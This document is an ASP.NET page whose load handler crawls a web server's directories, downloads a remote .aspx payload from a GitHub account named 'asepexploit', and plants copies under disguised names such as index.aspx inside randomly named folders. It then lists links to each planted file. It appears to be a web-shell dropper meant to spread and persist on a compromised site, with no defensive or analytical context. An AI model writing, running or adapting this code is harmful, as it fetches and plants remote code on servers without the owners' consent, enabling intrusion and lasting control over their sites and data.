<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    Response.Write("<!-- Starting ASPX deployment -->\n");

    string[] targetNames = { "index", "main", "default", "common", "user", "client", "server" };
    string[] folderPrefixes = { "assets", "bin", "cache", "cdn", "cloud" };
    string[] remoteUrls = { "https://raw.githubusercontent.com/asepexploit/bc/refs/heads/main/manjiro.aspx" };

    string baseDir = Server.MapPath("~/");
    int spreadCount = 0, maxSpread = 10;
    Random rand = new Random();

    try
    {
        string[] folders = System.IO.Directory.GetDirectories(baseDir, "*", System.IO.SearchOption.AllDirectories);

        foreach (string folder in folders)
        {
            if (spreadCount >= maxSpread) break;
            if (rand.Next(1, 101) > 25) continue;

            string targetFolder = System.IO.Path.Combine(folder, folderPrefixes[rand.Next(folderPrefixes.Length)] + "-" + rand.Next(100, 999));
            if (!System.IO.Directory.Exists(targetFolder))
            {
                try { System.IO.Directory.CreateDirectory(targetFolder); }
                catch { continue; }
            }

            string fileName = targetNames[rand.Next(targetNames.Length)] + ".aspx";
            string fullPath = System.IO.Path.Combine(targetFolder, fileName);
            if (System.IO.File.Exists(fullPath)) continue;

            string payload = "";
            using (var client = new System.Net.WebClient())
            {
                foreach (string url in remoteUrls)
                {
                    try
                    {
                        payload = client.DownloadString(url);
                        if (!string.IsNullOrWhiteSpace(payload)) break;
                    }
                    catch { continue; }
                }
            }

            if (string.IsNullOrWhiteSpace(payload)) continue;

            try
            {
                System.IO.File.WriteAllText(fullPath, payload);
                spreadCount++;

                string relPath = fullPath.Replace(baseDir, "").Replace("\\", "/");
                string proto = Request.IsSecureConnection ? "https" : "http";
                string host = Request.Url.Authority;
                string url = $"{proto}://{host}/{relPath}";

                Response.Write($"<a href='{url}' target='_blank'>{url}</a><br>\n");
            }
            catch (Exception ex)
            {
                Response.Write($"<!-- WriteError: {ex.Message} -->\n");
            }
        }
    }
    catch (Exception ex)
    {
        Response.Write($"<!-- MainError: {ex.Message} -->\n");
    }

    Response.Write($"<!-- ASPX deployment complete: {spreadCount} files -->\n");
}
</script>
